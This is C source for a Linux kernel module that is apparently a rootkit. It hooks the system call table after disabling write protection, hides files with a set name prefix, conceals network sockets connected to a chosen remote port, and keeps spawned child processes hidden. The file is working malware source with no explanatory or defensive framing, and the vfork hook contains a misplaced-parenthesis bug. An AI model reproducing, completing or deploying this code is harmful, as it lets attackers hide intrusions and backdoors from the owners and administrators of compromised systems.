#include "syscalls.h"
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/proc_ns.h>
#include <net/tcp.h>
#include <linux/inet_diag.h>

extern u8 module_hidden;
static unsigned long *syscall_table;

typedef asmlinkage long (*sys_call_stub)(const struct pt_regs *);

sys_call_stub orig_clone;
sys_call_stub orig_fork;
sys_call_stub orig_vfork;
sys_call_stub orig_exit;
sys_call_stub orig_exit_group;
sys_call_stub orig_kill;
sys_call_stub orig_getdents64;
sys_call_stub orig_recvmsg;

unsigned long *find_syscall_table(void)
{
    return (unsigned long *)kallsyms_lookup_name("sys_call_table");
}
/* File hiding */

asmlinkage long rk_getdents64(const struct pt_regs *pt_regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)pt_regs->si;

    int ret = orig_getdents64(pt_regs), err;
    unsigned long offset = 0;
    struct linux_dirent64 *dir, *kdirent = NULL;

    if (!module_hidden)
        return ret;

    if (is_hidden_proc(current->pid))
        return ret;

    if (ret <= 0)
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);
    if (err)
    {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret)
    {
        dir = (void *)kdirent + offset;

        if (memcmp(dir->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            int reclen = dir->d_reclen;
            ret -= reclen;
            memmove(dir, (void *)dir + reclen, ret - offset);
        }
        else offset += dir->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

    kfree(kdirent);
    return ret;
}

/* Socket hiding */

int hidden_socket(struct nlmsghdr *hdr)
{
    struct inet_diag_msg *r = NLMSG_DATA(hdr);

    return ntohs(r->id.idiag_dport) == RPORT;
}

asmlinkage long rk_recvmsg(const struct pt_regs *pt_regs)
{
    struct user_msghdr __user *msg = (struct user_msghdr __user *)pt_regs->si;

    long ret;
    struct nlmsghdr *nlh;
    long count;

    ret = orig_recvmsg(pt_regs);

    if (is_hidden_proc(current->pid))
        return ret;

    if (ret < 0)
        return ret;

    nlh = (struct nlmsghdr *)(msg->msg_iov->iov_base);

    if (nlh == NULL)
        return ret;

    count = ret;

    while (NLMSG_OK(nlh, count))
    {
        if (hidden_socket(nlh))
        {
            int offset = NLMSG_ALIGN((nlh)->nlmsg_len);
            memmove(nlh, (void *)nlh + offset, count);

            ret -= offset;
        }
        else nlh = NLMSG_NEXT(nlh, count);
    }

    return ret;
}

/* Process management */

asmlinkage long rk_clone(const struct pt_regs *pt_regs)
{
    long i = orig_clone(pt_regs);
    if (is_hidden_proc(current->pid) && i != -1)
        hide_proc(i);
    // FM_INFO("clone from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_fork(const struct pt_regs *pt_regs)
{
    long i = orig_fork(pt_regs);
    if (is_hidden_proc(current->pid) && i != -1)
        hide_proc(i);
    // FM_INFO("fork from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_vfork(const struct pt_regs *pt_regs)
{
    long i = orig_vfork(pt_regs);
    if (is_hidden_proc(current->pid && i != -1))
        hide_proc(i);
    // FM_INFO("vfork from %d to %ld\n", current->pid, i);
    return i;
}

asmlinkage long rk_exit(const struct pt_regs *pt_regs)
{
    // FM_INFO("exit from %d\n", current->pid);
    unhide_proc(current->pid);
    return orig_exit(pt_regs);
}

asmlinkage long rk_exit_group(const struct pt_regs *pt_regs)
{
    // FM_INFO("exit_group from %d\n", current->pid);
    unhide_proc(current->pid);
    return orig_exit_group(pt_regs);
}

asmlinkage long rk_kill(const struct pt_regs *pt_regs)
{
    long i = orig_kill(pt_regs);
    // FM_INFO("kill %ld code %ld", pt_regs->di, pt_regs->si);
    if (i == 0)
        unhide_proc(pt_regs->di);
    return i;
}

int sys_call_init(void)
{
    syscall_table = find_syscall_table();
    FM_INFO("Found syscall_table at %lx\n", *syscall_table);

    orig_clone = (sys_call_stub)syscall_table[__NR_clone];
    orig_fork = (sys_call_stub)syscall_table[__NR_fork];
    orig_vfork = (sys_call_stub)syscall_table[__NR_vfork];
    orig_exit = (sys_call_stub)syscall_table[__NR_exit];
    orig_exit_group = (sys_call_stub)syscall_table[__NR_exit_group];
    orig_kill = (sys_call_stub)syscall_table[__NR_kill];
    orig_getdents64 = (sys_call_stub)syscall_table[__NR_getdents64];
    orig_recvmsg = (sys_call_stub)syscall_table[__NR_recvmsg];

    disable_write_protect();

    syscall_table[__NR_clone] = (unsigned long)rk_clone;
    syscall_table[__NR_fork] = (unsigned long)rk_fork;
    syscall_table[__NR_vfork] = (unsigned long)rk_vfork;
    syscall_table[__NR_exit] = (unsigned long)rk_exit;
    syscall_table[__NR_exit_group] = (unsigned long)rk_exit_group;
    syscall_table[__NR_kill] = (unsigned long)rk_kill;
    syscall_table[__NR_getdents64] = (unsigned long)rk_getdents64;
    syscall_table[__NR_recvmsg] = (unsigned long)rk_recvmsg;

    enable_write_protect();

    return 0;
}

int sys_call_clean(void)
{
    disable_write_protect();

    syscall_table[__NR_clone] = (unsigned long)orig_clone;
    syscall_table[__NR_fork] = (unsigned long)orig_fork;
    syscall_table[__NR_vfork] = (unsigned long)orig_vfork;
    syscall_table[__NR_exit] = (unsigned long)orig_exit;
    syscall_table[__NR_exit_group] = (unsigned long)orig_exit_group;
    syscall_table[__NR_kill] = (unsigned long)orig_kill;
    syscall_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    syscall_table[__NR_recvmsg] = (unsigned long)orig_recvmsg;

    enable_write_protect();

    return 0;
}